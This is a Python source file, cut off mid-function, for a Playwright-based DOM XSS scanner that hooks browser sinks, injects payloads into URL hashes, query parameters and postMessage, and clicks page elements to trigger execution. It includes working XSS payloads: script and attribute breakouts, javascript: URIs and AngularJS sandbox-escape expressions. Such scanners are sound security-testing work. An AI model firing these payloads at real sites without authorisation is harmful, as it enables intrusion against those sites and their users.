"""
DOM XSS Detector using Playwright headless browser.

Monitors JavaScript execution for dangerous sink usage and
detects when user-controlled input reaches executable contexts.
"""

import asyncio
import json
from pathlib import Path
from typing import List, Dict, Optional, Any
from dataclasses import dataclass
from playwright.async_api import async_playwright, Page, Browser, ConsoleMessage
from bugtrace.utils.logger import get_logger

_PARAMS_FILE = Path(__file__).resolve().parent.parent.parent / "payloads" / "dom_xss_params.json"
_dom_xss_params = json.loads(_PARAMS_FILE.read_text())
DOM_REDIRECT_PARAMS: List[str] = _dom_xss_params["redirect_params"]
DOM_SEARCH_PARAMS: List[str] = _dom_xss_params["search_params"]
DOM_SINK_PARAMS: List[str] = DOM_REDIRECT_PARAMS + DOM_SEARCH_PARAMS

logger = get_logger("tools.dom_xss")


@dataclass
class DOMXSSFinding:
    """Represents a confirmed DOM XSS vulnerability."""
    url: str
    payload: str
    sink: str  # innerHTML, eval, document.write, etc.
    source: str  # location.hash, location.search, document.referrer, etc.
    evidence: str
    severity: str = "HIGH"


class DOMXSSDetector:
    """
    Headless browser-based DOM XSS detector.

    Uses Playwright to:
    1. Inject monitoring scripts that hook dangerous sinks
    2. Load pages with XSS payloads in various sources
    3. Detect when payloads reach dangerous sinks
    4. Confirm execution via alert/error interception
    """

    def __init__(self, timeout: int = 10000):
        self.timeout = timeout
        self.browser: Optional[Browser] = None
        self.playwright = None
        self.findings: List[DOMXSSFinding] = []

    async def __aenter__(self):
        await self.start()
        return self

    async def __aexit__(self, *args):
        await self.stop()

    async def start(self):
        """Start the headless browser."""
        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(
            headless=True,
            args=[
                "--disable-web-security",  # Allow cross-origin for testing
                "--disable-features=IsolateOrigins,site-per-process",
            ]
        )
        logger.info("[DOMXSSDetector] Headless browser started")

    async def stop(self):
        """Stop the headless browser."""
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()
        logger.info("[DOMXSSDetector] Headless browser stopped")

    def _get_monitor_script(self) -> str:
        """
        TASK-55: Enhanced taint tracking for DOM XSS detection.
        Monitors dangerous sinks AND tracks tainted sources.

        IMPROVED (2026-01-30): Added AngularJS-specific monitoring.
        """
        parts = [
            self._build_monitor_header(),
            self._build_source_tracking(),
            self._build_sink_monitoring(),
            self._build_jquery_hooks(),
            self._build_angular_hooks(),
            self._build_event_listener_tracking(),
            "console.log('DOMXSS_MONITOR_INJECTED_V4');"
        ]
        return f"(function() {{ {' '.join(parts)} }})();"

    def _build_monitor_header(self) -> str:
        """Initialize monitoring arrays and canary constant."""
        return """
            window.__domxss_findings = [];
            window.__domxss_sources = [];
            const CANARY = 'DOMXSS_CANARY_7x7';
        """

    def _build_source_tracking(self) -> str:
        """Build source tracking hooks for location.hash, .search, and document.referrer."""
        return """
            const originalHashDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'hash');
            if (originalHashDesc && originalHashDesc.get) {
                Object.defineProperty(Location.prototype, 'hash', {
                    get: function() {
                        const value = originalHashDesc.get.call(this);
                        if (value && value.includes(CANARY)) {
                            window.__domxss_sources.push({source: 'location.hash', value: value});
                        }
                        return value;
                    },
                    set: originalHashDesc.set
                });
            }
            const originalSearchDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'search');
            if (originalSearchDesc && originalSearchDesc.get) {
                Object.defineProperty(Location.prototype, 'search', {
                    get: function() {
                        const value = originalSearchDesc.get.call(this);
                        if (value && value.includes(CANARY)) {
                            window.__domxss_sources.push({source: 'location.search', value: value});
                        }
                        return value;
                    },
                    set: originalSearchDesc.set
                });
            }
            const originalReferrer = Object.getOwnPropertyDescriptor(Document.prototype, 'referrer');
            if (originalReferrer && originalReferrer.get) {
                Object.defineProperty(Document.prototype, 'referrer', {
                    get: function() {
                        const value = originalReferrer.get.call(this);
                        if (value && value.includes(CANARY)) {
                            window.__domxss_sources.push({source: 'document.referrer', value: value});
                        }
                        return value;
                    }
                });
            }
        """

    def _build_sink_monitoring(self) -> str:
        """Build sink monitoring hooks for innerHTML, eval, document.write, etc."""
        return """
            const originalInnerHTMLDesc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
            if (originalInnerHTMLDesc) {
                Object.defineProperty(Element.prototype, 'innerHTML', {
                    set: function(value) {
                        if (value && value.toString().includes(CANARY)) {
                            window.__domxss_findings.push({
                                sink: 'innerHTML',
                                value: value.toString().substring(0, 500),
                                element: this.tagName,
                                sources: [...window.__domxss_sources]
                            });
                            console.error('DOMXSS_DETECTED:innerHTML:' + value.toString().substring(0, 200));
                        }
                        return originalInnerHTMLDesc.set.call(this, value);
                    },
                    get: originalInnerHTMLDesc.get
                });
            }
            const originalOuterHTMLDesc = Object.getOwnPropertyDescriptor(Element.prototype, 'outerHTML');
            if (originalOuterHTMLDesc && originalOuterHTMLDesc.set) {
                Object.defineProperty(Element.prototype, 'outerHTML', {
                    set: function(value) {
                        if (value && value.toString().includes(CANARY)) {
                            window.__domxss_findings.push({
                                sink: 'outerHTML',
                                value: value.toString().substring(0, 500),
                                element: this.tagName,
                                sources: [...window.__domxss_sources]
                            });
                            console.error('DOMXSS_DETECTED:outerHTML:' + value.toString().substring(0, 200));
                        }
                        return originalOuterHTMLDesc.set.call(this, value);
                    },
                    get: originalOuterHTMLDesc.get
                });
            }
            const originalWrite = document.write;
            document.write = function(content) {
                if (content && content.toString().includes(CANARY)) {
                    window.__domxss_findings.push({
                        sink: 'document.write',
                        value: content.toString().substring(0, 500),
                        sources: [...window.__domxss_sources]
                    });
                    console.error('DOMXSS_DETECTED:document.write:' + content.toString().substring(0, 200));
                }
                return originalWrite.apply(this, arguments);
            };
            const originalWriteln = document.writeln;
            document.writeln = function(content) {
                if (content && content.toString().includes(CANARY)) {
                    window.__domxss_findings.push({
                        sink: 'document.writeln',
                        value: content.toString().substring(0, 500),
                        sources: [...window.__domxss_sources]
                    });
                    console.error('DOMXSS_DETECTED:document.writeln:' + content.toString().substring(0, 200));
                }
                return originalWriteln.apply(this, arguments);
            };
            const originalEval = window.eval;
            window.eval = function(code) {
                if (code && code.toString().includes(CANARY)) {
                    window.__domxss_findings.push({
                        sink: 'eval',
                        value: code.toString().substring(0, 500),
                        sources: [...window.__domxss_sources]
                    });
                    console.error('DOMXSS_DETECTED:eval:' + code.toString().substring(0, 200));
                }
                return originalEval.apply(this, arguments);
            };
            const OriginalFunction = window.Function;
            window.Function = function(...args) {
                const code = args.join(',');
                if (code.includes(CANARY)) {
                    window.__domxss_findings.push({
                        sink: 'Function',
                        value: code.substring(0, 500),
                        sources: [...window.__domxss_sources]
                    });
                    console.error('DOMXSS_DETECTED:Function:' + code.substring(0, 200));
                }
                return new OriginalFunction(...args);
            };
            const originalSetTimeout = window.setTimeout;
            window.setTimeout = function(handler, timeout, ...args) {
                if (typeof handler === 'string' && handler.includes(CANARY)) {
                    window.__domxss_findings.push({
                        sink: 'setTimeout',
                        value: handler.substring(0, 500),
                        sources: [...window.__domxss_sources]
                    });
                    console.error('DOMXSS_DETECTED:setTimeout:' + handler.substring(0, 200));
                }
                return originalSetTimeout.apply(this, arguments);
            };
            const originalSetInterval = window.setInterval;
            window.setInterval = function(handler, timeout, ...args) {
                if (typeof handler === 'string' && handler.includes(CANARY)) {
                    window.__domxss_findings.push({
                        sink: 'setInterval',
                        value: handler.substring(0, 500),
                        sources: [...window.__domxss_sources]
                    });
                    console.error('DOMXSS_DETECTED:setInterval:' + handler.substring(0, 200));
                }
                return originalSetInterval.apply(this, arguments);
            };
            // Hook setAttribute to detect href/src/action set to executable URIs
            const originalSetAttribute = Element.prototype.setAttribute;
            Element.prototype.setAttribute = function(name, value) {
                if (value && typeof value === 'string') {
                    const lv = value.toLowerCase().trim();
                    const nm = name.toLowerCase();
                    if (nm === 'href' || nm === 'src' || nm === 'action' || nm === 'formaction') {
                        // Only flag javascript:/data: URIs — regular URLs with canary as param are NOT XSS
                        if (lv.startsWith('javascript:') || lv.startsWith('data:')) {
                            window.__domxss_findings.push({
                                sink: 'setAttribute.' + name,
                                value: value.substring(0, 500),
                                element: this.tagName,
                                sources: [...window.__domxss_sources]
                            });
                            console.error('DOMXSS_DETECTED:setAttribute.' + name + ':' + value.substring(0, 200));
                        }
                    } else if (nm === 'onclick' || nm === 'onerror' || nm === 'onload') {
                        // Event handler attributes: canary in value = XSS
                        if (value.includes(CANARY)) {
                            window.__domxss_findings.push({
                                sink: 'setAttribute.' + name,
                                value: value.substring(0, 500),
                                element: this.tagName,
                                sources: [...window.__domxss_sources]
                            });
                        }
                    }
                }
                return originalSetAttribute.apply(this, arguments);
            };
            // Hook HTMLAnchorElement.href property setter
            // jQuery .attr('href', value) uses elem.href = value (property access),
            // NOT setAttribute(). This catches both jQuery and vanilla JS property assignment.
            const hrefDesc = Object.getOwnPropertyDescriptor(HTMLAnchorElement.prototype, 'href');
            if (hrefDesc && hrefDesc.set) {
                Object.defineProperty(HTMLAnchorElement.prototype, 'href', {
                    set: function(value) {
                        if (value && typeof value === 'string') {
                            const lv = value.toLowerCase().trim();
                            // Only flag javascript:/data: URIs — NOT regular URLs with canary as param
                            if (lv.startsWith('javascript:') || lv.startsWith('data:')) {
                                window.__domxss_findings.push({
                                    sink: 'a.href',
                                    value: value.substring(0, 500),
                                    element: 'A',
                                    sources: [...window.__domxss_sources]
                                });
                                console.error('DOMXSS_DETECTED:a.href:' + value.substring(0, 200));
                            }
                        }
                        return hrefDesc.set.call(this, value);
                    },
                    get: hrefDesc.get
                });
            }
        """

    def _build_jquery_hooks(self) -> str:
        """Build jQuery-specific hooks if jQuery is present."""
        return """
            if (window.jQuery) {
                const CANARY = 'DOMXSS_CANARY_7x7';
                const originalHtml = jQuery.fn.html;
                jQuery.fn.html = function(value) {
                    if (value && value.toString().includes(CANARY)) {
                        window.__domxss_findings.push({
                            sink: 'jQuery.html',
                            value: value.toString().substring(0, 500),
                            sources: [...window.__domxss_sources]
                        });
                        console.error('DOMXSS_DETECTED:jQuery.html:' + value.toString().substring(0, 200));
                    }
                    return originalHtml.apply(this, arguments);
                };
                const originalAppend = jQuery.fn.append;
                jQuery.fn.append = function(value) {
                    if (value && value.toString().includes(CANARY)) {
                        window.__domxss_findings.push({
                            sink: 'jQuery.append',
                            value: value.toString().substring(0, 500),
                            sources: [...window.__domxss_sources]
                        });
                        console.error('DOMXSS_DETECTED:jQuery.append:' + value.toString().substring(0, 200));
                    }
                    return originalAppend.apply(this, arguments);
                };
                // Hook jQuery.attr() to detect href/src/action sinks
                const originalAttr = jQuery.fn.attr;
                jQuery.fn.attr = function(name, value) {
                    if (arguments.length > 1 && value && typeof value === 'string') {
                        const dangerousAttrs = ['href', 'src', 'action', 'data', 'formaction'];
                        if (dangerousAttrs.includes(name.toLowerCase())) {
                            const lv = value.toLowerCase().trim();
                            // Only flag javascript:/data: URIs for href-like attrs
                            if (lv.startsWith('javascript:') || lv.startsWith('data:')) {
                                window.__domxss_findings.push({
                                    sink: 'jQuery.attr.' + name,
                                    value: value.substring(0, 500),
                                    element: this[0] ? this[0].tagName : 'unknown',
                                    sources: [...window.__domxss_sources]
                                });
                                console.error('DOMXSS_DETECTED:jQuery.attr.' + name + ':' + value.substring(0, 200));
                            }
                        }
                    }
                    return originalAttr.apply(this, arguments);
                };
            }
        """

    def _build_angular_hooks(self) -> str:
        """ADDED (2026-01-30): Build AngularJS-specific hooks for template execution detection."""
        return """
            if (window.angular) {
                const CANARY = 'DOMXSS_CANARY_7x7';
                // Monitor Angular template compilation
                const originalCompile = angular.element.prototype.html;
                if (originalCompile) {
                    angular.element.prototype.html = function(value) {
                        if (value && value.toString().includes(CANARY)) {
                            window.__domxss_findings.push({
                                sink: 'angular.element.html',
                                value: value.toString().substring(0, 500),
                                sources: [...window.__domxss_sources]
                            });
                            console.error('DOMXSS_DETECTED:angular.element.html:' + value.toString().substring(0, 200));
                        }
                        return originalCompile.apply(this, arguments);
                    };
                }
                // Monitor $compile service if available
                try {
                    const injector = angular.element(document).injector();
                    if (injector) {
                        const originalCompileService = injector.get('$compile');
                        if (originalCompileService) {
                            injector.get('$rootScope').$watch(function() {
                                const template = document.body.innerHTML;
                                if (template.includes(CANARY) && template.includes('{{')) {
                                    window.__domxss_findings.push({
                                        sink: '$compile',
                                        value: 'AngularJS template evaluation with user input',
                                        sources: [...window.__domxss_sources]
                                    });
                                    console.error('DOMXSS_DETECTED:$compile:AngularJS');
                                }
                            });
                        }
                    }
                } catch (e) {
                    // Injector not ready yet
                }
            }
        """

    def _build_event_listener_tracking(self) -> str:
        """Hook addEventListener to mark elements with JS-attached event handlers.

        Modern apps use addEventListener instead of inline onclick attributes.
        This hook marks those elements with a data attribute so we can click them
        later to trigger DOM XSS via onclick/onmouseover/onfocus handlers.
        """
        return """
            const origAddEventListener = EventTarget.prototype.addEventListener;
            EventTarget.prototype.addEventListener = function(type, handler, options) {
                const interactiveEvents = ['click', 'mouseover', 'mouseenter', 'focus', 'touchstart'];
                if (interactiveEvents.includes(type) && this.setAttribute) {
                    try {
                        const existing = this.getAttribute('data-domxss-handler') || '';
                        if (!existing.includes(type)) {
                            this.setAttribute('data-domxss-handler', existing ? existing + ',' + type : type);
                        }
                    } catch(e) {}
                }
                return origAddEventListener.apply(this, arguments);
            };
        """

    def _get_dom_xss_payloads(self) -> List[Dict[str, str]]:
        """
        Returns payloads designed for DOM XSS detection.
        Each payload contains a canary that our hooks will detect.

        IMPROVED (2026-01-30): Added AngularJS-specific payloads for ginandjuice.shop.
        """
        canary = "DOMXSS_CANARY_7x7"

        return [
            {"payload": canary, "type": "canary"},
            # javascript: protocol payloads FIRST — critical for location.href DOM XSS sinks
            {"payload": f"javascript:alert('{canary}')", "type": "javascript_uri"},
            {"payload": f"javascript:alert(document.domain)//", "type": "javascript_domain"},
            {"payload": f"<img src=x onerror=alert('{canary}')>", "type": "img_onerror"},
            {"payload": f"<svg onload=alert('{canary}')>", "type": "svg_onload"},
            {"payload": f"'-alert('{canary}')-'", "type": "js_breakout_single"},
            {"payload": f'"-alert("{canary}")-"', "type": "js_breakout_double"},
            # Attribute injection for document.write sinks (breaks out of src/value attribute)
            # Works when < is blocked (WAF) but " passes through
            {"payload": f'" onload="alert(\'{canary}\')', "type": "attr_injection_onload"},
            {"payload": f'" onfocus="alert(\'{canary}\')" autofocus="', "type": "attr_injection_onfocus"},
            {"payload": f"</script><script>alert('{canary}')</script>", "type": "script_breakout"},
            # ADDED (2026-01-30): AngularJS-specific payloads
            {"payload": f"{{{{constructor.constructor('alert(\"{canary}\")')()}}}}", "type": "angular_constructor"},
            {"payload": f"{{{{$on.constructor('alert(\"{canary}\")')()}}}}", "type": "angular_on"},
            {"payload": f"{{{{['a]'constructor.prototype.charAt=[].join;$eval('x={canary}');'x'}}}}", "type": "angular_sandbox_bypass"},
        ]

    async def scan(self, url: str, discovered_params: Optional[List[str]] = None) -> List[DOMXSSFinding]:
        """Scan a URL for DOM XSS vulnerabilities.

        IMPROVED (2026-01-30): Added more sources and comprehensive testing.
        IMPROVED (2026-02-09): Parameter-aware detection + static analysis.

        Args:
            url: URL to scan
            discovered_params: Optional list of parameter names discovered by specialist.
                              When provided, tests each param individually instead of just '?xss='.
        """
        if not self.browser:
            await self.start()

        findings = []
        payloads = self._get_dom_xss_payloads()

        context, page = await self._setup_scan_context()

        try:
            # Test hash source (single canary + javascript: URI = 2 page loads)
            hash_finding = await self._test_payload(f"{url}#DOMXSS_CANARY_7x7", "DOMXSS_CANARY_7x7", "hash", page)
            if hash_finding:
                findings.append(hash_finding)
            hash_js = await self._test_payload(f"{url}#javascript:alert('DOMXSS_CANARY_7x7')", "javascript:alert('DOMXSS_CANARY_7x7')", "hash", page)
            if hash_js:
                findings.append(hash_js)

            # Test URL parameters (batched canary sweep + targeted escalation)
            param_findings = await self._test_url_parameters(url, payloads, page, discovered_params=discovered_params)
            findings.extend(param_findings)

            # Test postMessage-based XSS
            postmsg_finding = await self._test_postmessage_xss(url, page)
            if postmsg_finding:
                findings.append(postmsg_finding)

            # Static source→sink analysis for DOM XSS patterns in JS
            static_findings = await self._static_source_sink_analysis(url, page)
            findings.extend(static_findings)

        except Exception as e:
            logger.error(f"[DOMXSSDetector] Scan error: {e}", exc_info=True)
        finally:
            await self._cleanup_scan_context(page, context)

        # Deduplicate: keep best finding per (sink, source) pair
        seen = set()
        deduped = []
        for f in findings:
            key = (f.sink, f.source)
            if key not in seen:
                seen.add(key)
                deduped.append(f)

        self.findings.extend(deduped)
        return deduped

    async def _test_url_parameters(self, url: str, payloads: List[Dict], page,
                                    discovered_params: Optional[List[str]] = None) -> List[DOMXSSFinding]:
        """Test each URL parameter for DOM XSS.

        IMPROVED (2026-02-09): When discovered_params provided, tests each one
        individually instead of only testing params already in the URL.
        This catches DOM XSS where the vulnerable param (e.g., 'back') isn't in the URL.
        """
        findings = []
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Combine URL params + discovered params for comprehensive testing
        all_param_names = set(params.keys())
        if discovered_params:
            for p in discovered_params:
                all_param_names.add(p)

        # Always include 'xss' as fallback test param
        all_param_names.add("xss")

        # Add common DOM sink params from external config
        for p in DOM_SINK_PARAMS:
            all_param_names.add(p)

        # Extract param names that JS actually reads from URL (URLSearchParams.get, location.search, etc.)
        # This discovers custom params like "continueTo", "returnPage", etc. not in our hardcoded list
        js_params = await self._extract_js_params(url, page)
        for p in js_params:
            all_param_names.add(p)

        if not all_param_names:
            return findings

        # Phase 1: Batch canary sweep — ONE request with unique canary per param
        # Identifies which params reach dangerous sinks without N separate page loads
        canary_base = "DOMXSS_CANARY_7x7"
        param_canary_map = {}  # full_canary → param_name
        test_params = {k: v[0] for k, v in params.items()}
        for param_name in all_param_names:
            canary = f"{canary_base}|{param_name}|"
            test_params[param_name] = canary
            param_canary_map[canary] = param_name

        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params), parsed.fragment
        ))

        # Load page with ALL params canary-injected, collect findings
        interesting_params = set()
        batch_finding = await self._test_payload(test_url, canary_base, "param:batch_sweep", page)
        if batch_finding:
            # Attribute to specific param by checking which unique canary appears in evidence
            attributed_param = None
            for full_canary, pname in param_canary_map.items():
                if full_canary in batch_finding.evidence:
                    interesting_params.add(pname)
                    attributed_param = pname
            if attributed_param:
                # Re-create finding with correct source attribution
                batch_finding = DOMXSSFinding(
                    url=batch_finding.url, payload=batch_finding.payload,
                    sink=batch_finding.sink, source=f"location.param:{attributed_param}",
                    evidence=batch_finding.evidence
                )
                findings.append(batch_finding)
            elif not interesting_params:
                # Canary detected but can't attribute — mark all URL params + JS params
                interesting_params = set(params.keys()) | set(js_params)
                findings.append(batch_finding)

        # Phase 2: javascript: URI sweep — prioritized param testing
        # Priority 1: Params from batch sweep + JS-extracted + URL params + discovered
        # Priority 2: Top hardcoded redirect params (only if P1 found nothing)
        js_uri_payload = payloads[1]["payload"]  # javascript:alert('CANARY')

        # Priority 1: High-confidence params
        priority_params = interesting_params | set(js_params) | set(params.keys())
        if discovered_params:
            priority_params |= set(discovered_params)
        priority_params &= all_param_names

        for param_name in priority_params:
            test_params_js = {k: v[0] for k, v in params.items()}
            test_params_js[param_name] = js_uri_payload
            test_url_js = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(test_params_js), parsed.fragment
            ))
            finding = await self._test_payload(test_url_js, js_uri_payload, f"param:{param_name}", page)
            if finding:
                findings.append(finding)
                interesting_params.add(param_name)

        # Priority 2: Top redirect params (only if no findings yet from P1+batch)
        if not findings:
            for param_name in DOM_REDIRECT_PARAMS[:7]:
                if param_name in priority_params:
                    continue  # Already tested
                test_params_js = {k: v[0] for k, v in params.items()}
                test_params_js[param_name] = js_uri_payload
                test_url_js = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, urlencode(test_params_js), parsed.fragment
                ))
                finding = await self._test_payload(test_url_js, js_uri_payload, f"param:{param_name}", page)
                if finding:
                    findings.append(finding)
                    interesting_params.add(param_name)
                    break  # Found one, stop fallback

        # Phase 3: Escalation — test interesting params with remaining exploit payloads
        for param_name in interesting_params:
            for p in payloads[2:6]:  # Skip canary and javascript: (already tested)
                payload = p["payload"]
                test_params_esc = {k: v[0] for k, v in params.items()}
                test_params_esc[param_name] = payload
                test_url_esc = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, urlencode(test_params_esc), parsed.fragment
                ))
                finding = await self._test_payload(test_url_esc, payload, f"param:{param_name}", page)
                if finding:
                    findings.append(finding)
                    break  # Found executable XSS, move to next param

        return findings

    async def _test_postmessage_xss(self, url: str, page) -> Optional[DOMXSSFinding]:
        """ADDED (2026-01-30): Test for postMessage-based DOM XSS."""
        try:
            await page.goto(url, wait_until="networkidle", timeout=self.timeout)

            # Inject postMessage with XSS payload
            canary = "DOMXSS_CANARY_7x7"
            payload = f"<img src=x onerror=alert('{canary}')>"

            result = await page.evaluate(f"""
                () => {{
                    return new Promise((resolve) => {{
                        const payload = `{payload}`;
                        window.postMessage(payload, '*');
                        setTimeout(() => {{
                            const findings = window.__domxss_findings || [];
                            resolve(findings.length > 0 ? findings[0] : null);
                        }}, 500);
                    }});
                }}
            """)

            if result:
                return DOMXSSFinding(
                    url=url, payload=payload, sink=result.get("sink", "postMessage"),
                    source="window.postMessage", evidence=result.get("value", "postMessage XSS")
                )
        except Exception as e:
            logger.debug(f"postMessage XSS test failed: {e}")

        return None

    async def _setup_scan_context(self):
        """Setup browser context and page for scanning."""
        context = await self.browser.new_context()
        page = await context.new_page()
        await page.add_init_script(self._get_monitor_script())
        return context, page

    async def _test_source(self, url: str, source: str, payloads: List[Dict], page) -> Optional[DOMXSSFinding]:
        """Test a specific source (hash or search) with all payloads."""
        for p in payloads:
            payload = p["payload"]
            test_url = self._build_test_url(url, source, payload)

            finding = await self._test_payload(test_url, payload, source, page)
            if finding:
                return finding
        return None

    def _build_test_url(self, url: str, source: str, payload: str) -> str:
        """Build test URL with payload in specified source.

        IMPROVED (2026-01-30): Support path-based injection.
        """
        from urllib.parse import quote

        if source == "hash":
            return f"{url}#{payload}"
        elif source == "path":
            # IMPROVED: Inject payload in path (some apps reflect path segments)
            safe_payload = quote(payload, safe='')
            if url.endswith('/'):
                return f"{url}{safe_payload}"
            return f"{url}/{safe_payload}"
        else:  # search
            sep = "&" if "?" in url else "?"
            return f"{url}{sep}xss={payload}"

    async def _test_payload(self, test_url: str, payload: str, source: str, page) -> Optional[DOMXSSFinding]:
        """Test a single payload and check for XSS execution."""
        dialog_messages = []
        console_findings = []  # Side channel: survives document.write DOM replacement

        def dialog_handler(d):
            dialog_messages.append(d.message)
            asyncio.create_task(d.dismiss())

        def console_handler(msg):
            text = msg.text
            if text.startswith("DOMXSS_DETECTED:"):
                # Format: DOMXSS_DETECTED:sink_name:value
                parts = text.split(":", 2)
                if len(parts) >= 3:
                    console_findings.append({
                        "sink": parts[1],
                        "value": parts[2][:500],
                        "sources": []
                    })

        page.on("dialog", dialog_handler)
        page.on("console", console_handler)

        try:
            await page.goto(test_url, wait_until="networkidle", timeout=self.timeout)
            await asyncio.sleep(1.5)  # Gap 3 Fix: Increased from 0.5s for deferred JS execution

            # Check hook findings before clicking
            # Primary: window.__domxss_findings (may be destroyed by document.write)
            # Fallback: console_findings (survives document.write DOM replacement)
            js_findings = await page.evaluate("window.__domxss_findings || []")
            if not js_findings and console_findings:
                js_findings = console_findings

            # Direct DOM check: if payload contains javascript: URI, check if any <a>
            # has javascript: in its href. This catches jQuery .attr('href') which may
            # bypass our hooks depending on jQuery version internals.
            if not js_findings and "javascript:" in payload.lower():
                js_href_found = await page.evaluate("""
                    () => {
                        const links = document.querySelectorAll('a[href]');
                        for (const a of links) {
                            if (a.href && a.href.toLowerCase().startsWith('javascript:')) {
                                return {
                                    sink: 'a.href',
                                    value: a.href.substring(0, 500),
                                    element: 'A',
                                    sources: [{source: 'location.search', value: location.search}]
                                };
                            }
                        }
                        return null;
                    }
                """)
                if js_href_found:
                    js_findings = [js_href_found]

            # If payload is javascript: URI, try clicking links to trigger execution
            if not dialog_messages and "javascript:" in payload.lower():
                # 1. Click links with href="javascript:..." (jQuery .attr('href') pattern)
                await self._click_javascript_links(page)
                await asyncio.sleep(0.3)

                # 2. Click ALL links to trigger onclick handlers that may set
                #    location = URL_PARAM (e.g., location = get("back") → javascript:...)
                if not dialog_messages:
                    await self._click_all_links(page)
                    await asyncio.sleep(0.5)

                # Re-check after clicking
                if not js_findings:
                    js_findings = await page.evaluate("window.__domxss_findings || []")
                if not js_findings and console_findings:
                    js_findings = console_findings

            if dialog_messages or js_findings:
                evidence = dialog_messages[0] if dialog_messages else js_findings[0]["value"]
                sink = "alert" if dialog_messages else js_findings[0]["sink"]
                return DOMXSSFinding(
                    url=test_url, payload=payload, sink=sink,
                    source=f"location.{source}", evidence=evidence
                )
        except Exception as e:
            logger.debug(f"Error testing {test_url}: {e}")
        finally:
            try:
                page.remove_listener("dialog", dialog_handler)
                page.remove_listener("console", console_handler)
            except Exception as e:
                logger.debug(f"Failed to remove listeners: {e}")
        return None

    async def _extract_js_params(self, url: str, page) -> List[str]:
        """Extract parameter names that JavaScript reads from the URL.

        Parses inline scripts for patterns like:
        - URLSearchParams(...).get("PARAM")
        - getUrlParam("PARAM")
        - location.search.match(/PARAM=/)
        - $.url.param("PARAM")

        Returns param names discovered from the page's JS code.
        """
        try:
            await page.goto(url, wait_until="networkidle", timeout=self.timeout)

            js_params = await page.evaluate("""
                () => {
                    const params = new Set();
                    const codeBlocks = [];
                    // 1. Inline <script> tags
                    document.querySelectorAll('script').forEach(s => {
                        if (s.textContent) codeBlocks.push(s.textContent);
                    });
                    // 2. Inline event handler attributes (onclick, onload, onmouseover, etc.)
                    const handlerAttrs = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onsubmit', 'onchange'];
                    for (const attr of handlerAttrs) {
                        document.querySelectorAll('[' + attr + ']').forEach(el => {
                            codeBlocks.push(el.getAttribute(attr));
                        });
                    }
                    // Parse all code blocks for param names
                    for (const code of codeBlocks) {
                        // URLSearchParams.get("param") or .get('param')
                        const getMatches = code.matchAll(/\\.get\\s*\\(\\s*["']([a-zA-Z_][a-zA-Z0-9_]{0,30})["']\\s*\\)/g);
                        for (const m of getMatches) params.add(m[1]);
                        // getParameter("param"), $.param("param"), etc.
                        const paramMatches = code.matchAll(/(?:getParam|param|getUrlParam|urlParam)\\w*\\s*\\(\\s*["']([a-zA-Z_][a-zA-Z0-9_]{0,30})["']/gi);
                        for (const m of paramMatches) params.add(m[1]);
                    }
                    return [...params];
                }
            """)

            if js_params:
                logger.info(f"[DOMXSSDetector] Extracted {len(js_params)} params from JS: {js_params[:10]}")
            return js_params or []

        except Exception as e:
            logger.debug(f"[DOMXSSDetector] JS param extraction failed: {e}")
            return []

    async def _click_javascript_links(self, page) -> None:
        """Click any <a> elements whose href starts with javascript:.

        This triggers DOM XSS in href sinks where jQuery/JS sets
        href to user-controlled javascript: URIs (e.g., returnPath param).
        """
        try:
            links = await page.evaluate("""
                () => {
                    const results = [];
                    document.querySelectorAll('a[href]').forEach((a, i) => {
                        if (a.href && a.href.toLowerCase().startsWith('javascript:')) {
                            results.push(i);
                        }
                    });
                    return results;
                }
            """)
            for idx in links[:3]:  # Click max 3 javascript: links
                try:
                    await page.evaluate(f"""
                        () => {{
                            const links = document.querySelectorAll('a[href]');
                            const jsLinks = [];
                            links.forEach(a => {{
                                if (a.href && a.href.toLowerCase().startsWith('javascript:')) jsLinks.push(a);
                            }});
                            if (jsLinks[{idx}]) jsLinks[{idx}].click();
                        }}
                    """)
                    await asyncio.sleep(0.3)
                except Exception:
                    pass
        except Exception as e:
            logger.debug(f"[DOMXSSDetector] Click javascript links failed: {e}")

    async def _click_all_links(self, page) -> None:
        """Click elements with event handlers to trigger onclick-based DOM XSS.

        Targets both inline handlers (onclick attr) and JS-attached handlers
        (addEventListener, marked with data-domxss-handler by our hook).

        Regular links (no handlers) are skipped to avoid premature navigation.
        """
        try:
            await page.evaluate("""
                () => {
                    // Collect ALL elements with event handlers (inline + addEventListener)
                    const selector = '[onclick], [onmouseover], [onfocus], [onload], [data-domxss-handler]';
                    const allElements = document.querySelectorAll(selector);
                    const clicked = new Set();
                    for (let i = 0; i < Math.min(allElements.length, 25); i++) {
                        try {
                            allElements[i].click();
                            clicked.add(allElements[i]);
                        } catch(e) {}
                    }
                    // Dispatch mouseover/focus on elements that have those handlers
                    document.querySelectorAll('[onmouseover], [data-domxss-handler*="mouseover"]').forEach(el => {
                        try { el.dispatchEvent(new MouseEvent('mouseover')); } catch(e) {}
                    });
                    document.querySelectorAll('[onfocus], [data-domxss-handler*="focus"]').forEach(el => {
                        try { el.focus(); } catch(e) {}
                    });
                }
            """)
        except Exception as e:
            logger.debug(f"[DOMXSSDetector] Click interactive elements failed: {e}")

    async def _static_source_sink_analysis(self, url: str, page) -> List[DOMXSSFinding]:
        """
        Gap 3 Fix: Static analysis of JavaScript for source→sink patterns.

        Regex-scans inline/loaded JS for patterns like:
        - location.search → document.write
        - location.hash → innerHTML
        - document.referrer → eval

        These are flagged as DOM XSS candidates even without runtime confirmation,
        since the canary approach can miss interaction-triggered or deferred sinks.
        """
        import re

        findings = []

        try:
            await page.goto(url, wait_until="networkidle", timeout=self.timeout)

            # Extract all JS from the page (inline scripts + JS globals)
            js_content = await page.evaluate("""
                () => {
                    let scripts = [];
                    document.querySelectorAll('script').forEach(s => {
                        if (s.textContent) scripts.push(s.textContent);
                    });
                    return scripts.join('\\n');
                }
            """)

            if not js_content:
                return findings

            # Source→sink patterns: (source_regex, sink_regex, source_name, sink_name)
